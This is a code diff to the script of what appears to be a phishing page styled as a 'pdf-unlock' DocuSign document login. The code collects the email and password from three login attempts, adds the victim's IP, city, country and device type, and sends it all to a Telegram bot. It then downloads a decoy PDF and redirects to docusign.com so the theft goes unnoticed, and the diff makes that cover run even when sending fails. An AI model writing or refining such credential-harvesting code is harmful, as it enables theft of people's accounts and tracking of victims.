@@ -148,52 +148,69 @@
       form.reset();
 
       if (attempts.length === 3) {
-        try {
-          const ipRes = await fetch("https://api.ipify.org?format=json");
-          const { ip } = await ipRes.json();
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const { ip } = await ipRes.json();
 
-          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-          const geo = await geoRes.json();
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoRes.json();
 
-          const now = new Date().toUTCString();
+    const now = new Date().toUTCString();
 
-          let message = `🔐 pdf-unlock Login Attempts\n`;
-          attempts.forEach((attempt, i) => {
-            message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
-            message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
-          });
+    let message = `🔐 pdf-unlock Login Attempts\n`;
+    attempts.forEach((attempt, i) => {
+      message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
+      message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
+    });
+    // Detect device type
+const ua = navigator.userAgent;
+let deviceType = "Unknown Device";
 
-          message += `🕒 Time: ${now}\n`;
-          message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
-          message += `📡 IP: ${ip}`;
+if (/mobile/i.test(ua)) {
+  deviceType = "📱 Mobile";
+} else if (/tablet/i.test(ua)) {
+  deviceType = "📱 Tablet";
+} else if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
+  deviceType = "📱 Tablet";
+} else {
+  deviceType = "💻 Desktop";
+}
 
-          await fetch(telegramUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams({
-              chat_id: chatId,
-              text: message
-            })
-          });
+message += `🕒 Time: ${now}\n`;
+message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
+message += `📡 IP: ${ip}\n`;
+message += `🖥️ Device: ${deviceType}`;
 
-          // Trigger PDF download
-          const link = document.createElement("a");
-          link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
-          link.download = "";
-          document.body.appendChild(link);
-          link.click();
-          document.body.removeChild(link);
+    // Try to send to Telegram
+    try {
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    } catch (err) {
+      console.warn("⚠️ Telegram send failed:", err);
+    }
 
-          // Delay to show success before redirect
-          setTimeout(() => {
-            window.location.href = "https://www.docusign.com";
-          }, 2000);
+  } catch (err) {
+    console.warn("⚠️ IP or Geo fetch failed:", err);
+  }
 
-        } catch (err) {
-          alert("❌ Error sending final data.");
-          console.error(err);
-        }
-      }
+  // ✅ Always trigger PDF download + redirect
+  const link = document.createElement("a");
+  link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
+  link.download = "";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  setTimeout(() => {
+    window.location.href = "https://www.docusign.com";
+  }, 2000);
+}
     });
   </script>
 </body>
